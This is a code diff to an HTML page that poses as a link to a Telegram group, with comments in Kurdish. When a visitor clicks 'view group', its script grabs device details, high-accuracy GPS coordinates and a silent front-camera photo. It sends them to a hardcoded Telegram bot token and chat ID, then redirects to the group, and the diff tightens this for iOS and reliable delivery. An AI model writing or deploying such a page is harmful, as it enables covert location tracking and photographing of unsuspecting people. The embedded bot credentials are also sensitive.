@@ -55,6 +55,7 @@
             transition: background 0.2s;
         }
         .btn:hover { background-color: #1d82b3; }
+        .btn:disabled { background-color: #a0c3d2; cursor: not-allowed; }
     </style>
 </head>
 <body>
@@ -75,71 +76,82 @@ const BOT_TOKEN = "7953266205:AAElpU3B3iAytm4K7u_iU7q-1-N9oInK90I";
 const CHAT_ID = "1629990392";
 
 document.getElementById("viewGroupBtn").addEventListener("click", async function() {
+    const btn = this;
+    btn.innerText = "تکایە چاوەڕێ ببه...";
+    btn.disabled = true;
+
     let text = "🦅 زانیاری نوێ وەرگیرا!\n\n";
-    text += "🌐 وێبگەر: " + navigator.userAgent.split(" ")[0] + "\n";
-    text += "📱 ئامێر: " + (/iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iPhone (iOS)" : "Android") + "\n";
-    text += "⚙️ بزوێنەر: " + navigator.platform + "\n";
+    text += "🌐 User Agent: " + navigator.userAgent + "\n";
     text += "📐 شاشە: " + window.screen.width + "x" + window.screen.height + "\n";
     text += "⏰ کات: " + new Date().toLocaleTimeString() + "\n";
 
-    // داواکردنی لۆکەیشنی GPS لەگەڵ timeoutی گونجاو
-    let mapsUrl = "مۆڵەت نەدرا یان کات بەسەرچوو!";
+    // ١. داواکردنی GPS
+    let mapsUrl = "مۆڵەت نەدرا!";
     if (navigator.geolocation) {
         try {
             const pos = await new Promise((resolve, reject) => {
                 navigator.geolocation.getCurrentPosition(resolve, reject, {
                     enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
+                    timeout: 8000
                 });
             });
             mapsUrl = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
         } catch (e) {
-            console.log("GPS Error:", e);
+            mapsUrl = "ڕەتکرایەوە یان کاتی بەسەرچوو";
         }
     }
     text += "📍 نەخشەی GPS: " + mapsUrl;
 
-    // هەوڵدان بۆ گرتنی وێنە
+    // ٢. وێنەگرتن بە کامێرا
+    let imageBlob = null;
     try {
-        let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        let video = document.createElement('video');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.createElement('video');
+        video.setAttribute('playsinline', ''); // تایبەت بۆ Safari و iOS
         video.srcObject = stream;
         await video.play();
 
-        let canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        let ctx = canvas.getContext('2d');
+        const canvas = document.createElement('canvas');
+        canvas.width = 480;
+        canvas.height = 640;
+        const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
+
         stream.getTracks().forEach(track => track.stop());
 
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-
-        let formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, "photo.jpg");
-        formData.append("caption", text);
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: "POST",
-            body: formData
-        });
-
+        imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.6));
     } catch (e) {
-        // ئەگەر کامێرا کاری نکرد یان ڕەتکرایەوە، تەنها دەق نێردرێت
-        let formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("text", text + "\n❌ مۆڵەتی کامێرا نەدرا!");
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            body: formData
-        });
+        text += "\n❌ کامێرا ڕەتکرایەوە یان پشتگیری نەکرا.";
     }
 
-    // گواستنەوە بۆ گروپی تێلیگرام دوای تەواوبوونی پرۆسەی ناردن
+    // ٣. ناردن بۆ تێلیگرام و چاوەڕوانکردنی وەڵام
+    try {
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        let formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+
+        if (imageBlob) {
+            url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            formData.append("photo", imageBlob, "photo.jpg");
+            formData.append("caption", text);
+        } else {
+            formData.append("text", text);
+        }
+
+        // وەستان تا ناردنەکە ١٠٠٪ سەرکەوتوو دەبێت
+        const response = await fetch(url, {
+            method: "POST",
+            body: formData
+        });
+
+        const resData = await response.json();
+        console.log("Telegram Response:", resData);
+
+    } catch (err) {
+        console.error("Fetch Error:", err);
+    }
+
+    // ٤. تەنها دوای ناردنی تەواو، ڕەوانەی تێلیگرامی دەکات
     window.location.href = "https://t.me/kurdish_sys";
 });
 </script>
